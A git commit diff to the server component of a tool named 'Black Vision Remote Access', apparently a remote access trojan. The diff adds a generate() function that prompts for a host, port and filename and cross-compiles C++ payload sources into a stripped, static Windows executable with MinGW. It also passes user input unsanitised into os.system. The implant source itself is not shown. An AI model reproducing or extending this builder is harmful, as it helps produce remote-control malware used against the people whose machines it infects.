61d048267aaa5dd1ea1943e05e3a3f9eafc5b4ca
Fahad Mustafa <fahad.mustafa0012@gmail.com>
2019-07-06 22:37:20 +0500

    shutil.which(cmd, mode=os.F_OK | os.X_OK, path=None)

--- server/core.py
+++ server/core.py
@@ -1,16 +1,13 @@
 import os
-
 import colorama
+from shutil import which
+
 colorama.init()
 def banner():
     banner_one =  colorama.Fore.LIGHTGREEN_EX + r"""
-    ██████╗ ██╗      █████╗  ██████╗██╗  ██╗    ██╗   ██╗██╗███████╗██╗ ██████╗ ███╗   ██╗
-    ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝    ██║   ██║██║██╔════╝██║██╔═══██╗████╗  ██║
-    ██████╔╝██║     ███████║██║     █████╔╝     ██║   ██║██║███████╗██║██║   ██║██╔██╗ ██║
-    ██╔══██╗██║     ██╔══██║██║     ██╔═██╗     ╚██╗ ██╔╝██║╚════██║██║██║   ██║██║╚██╗██║
-    ██████╔╝███████╗██║  ██║╚██████╗██║  ██╗     ╚████╔╝ ██║███████║██║╚██████╔╝██║ ╚████║
-    ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝      ╚═══╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝
-                                                                                                               
+    ____________________________
+    _Black Vision Remote Access_    
+     |           ~            |                    
     """ + colorama.Style.RESET_ALL
 
     return banner_one
@@ -20,3 +17,41 @@ def clear():
         os.system("cls")
     else:
         os.system("clear")
+
+def generate():
+
+    def mingw_check(path):
+        print("[~] Checking if mingw compiler is installed.")
+        p = which(path)
+        if(p):
+            print("[+] Found " + str(p))
+            return True
+        else :
+            print("[-] Not Installed.")
+            return False
+
+    if(os.name == "nt"):
+        if(mingw_check("g++") == True):
+            print("[+] Generating Executable..")
+            host = input("[?] Enter Host : ")
+            port = input("[?] Enter Port : ")
+            filename = input("[?] Filename : ")
+            # First Change Host and Port then continue
+            wincmd = "g++ main.cpp blackvision.cpp -MD -s -o "+filename+" -lws2_32 -lwininet -static"
+            os.system(wincmd)
+        else :
+            print("[-] Please install Mingw Compiler (http://www.mingw.org/)")
+    else:
+        if(mingw_check("i686-w64-mingw32-g++") == True):
+            print("[+] Generating Executable..")
+            host = input("[?] Enter Host : ")
+            port = input("[?] Enter Port : ")
+            filename = input("[?] Filename : ")
+            # Change Host port then continue
+            cmd = "i686-w64-mingw32-g++ main.cpp blackvision.cpp -MD -s -o "+filename+" -lws2_32 -lwininet -static"
+            os.system(cmd)
+
+        else:
+            print("[+] Attempting to Install mingw..")
+            os.system("sudo apt-get install mingw-w64")
+
